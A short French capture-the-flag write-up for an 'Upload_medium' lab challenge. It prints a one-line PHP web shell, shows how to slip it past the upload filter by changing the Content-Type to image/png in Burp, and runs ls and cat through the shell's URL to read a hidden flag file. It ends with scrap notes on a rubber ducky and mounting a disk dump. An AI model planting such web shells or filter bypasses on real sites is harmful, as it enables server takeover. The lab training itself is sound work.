# Secu
*   1 . Upload_medium
Il faut tout d'abord créer un fichier en `.php` comme par exemple, `payload.php`.
Ce dossier devra contenir les lignes suivantes :
```
<?php
echo shell_exec($_GET['cmd']);
?>*
```
Ensuite, nous avant de l'upload, nous utiliserons une extension de navigateur comme par exemple Foxy proxy et le logiciel Burp afin de pouvoir changer le fichier envoyé.
Grace a burp, nous devons modifier la ligne :
`Content-Type: application/octet-stream`
par :
`Content-Type: image/png`
Il faut ensuite appuyer sur forward dans Burp.
et enfin désactiver notre proxy.

On arrive sur la partie délicate, il faut ouvrir le fichier étant apparu sur la page.
Grace au php, nous avons accès au cmd depuis le lien du site, il suffit de le modifier un peu:
`http://ctf-labo.cyber-stuff.net/upload_medium/uploads/test.php?cmd=`

donc il suffit de mettre:
`ls` qui permet de lire le dossier
`%20` qui place des espaces
`-la` qui permet de voir les fichiers cachés
`../` qui permet de revenir en arrière

dans un vrai cmd, la commande nous donnerais:
`ls -la ../../`
et parmis les fichiers, nous voyeons un dossier qui s'appelle `.flag`

ensuite, nous remplaçons `ls -la` (ls%20-la) par `cat%20` et on rajoute a la fin le nom du fichier, se qui nous ouvre le fichier avec le flag a l'intérieur

`http://ctf-labo.cyber-stuff.net/upload_medium/uploads/test.php?cmd=cat%20../../.flag`








rubber ducky hack
file dump.dd

how to mount dd file
hdiutil attach -imagekey diskimage-class=CRawDiskImage dump.dd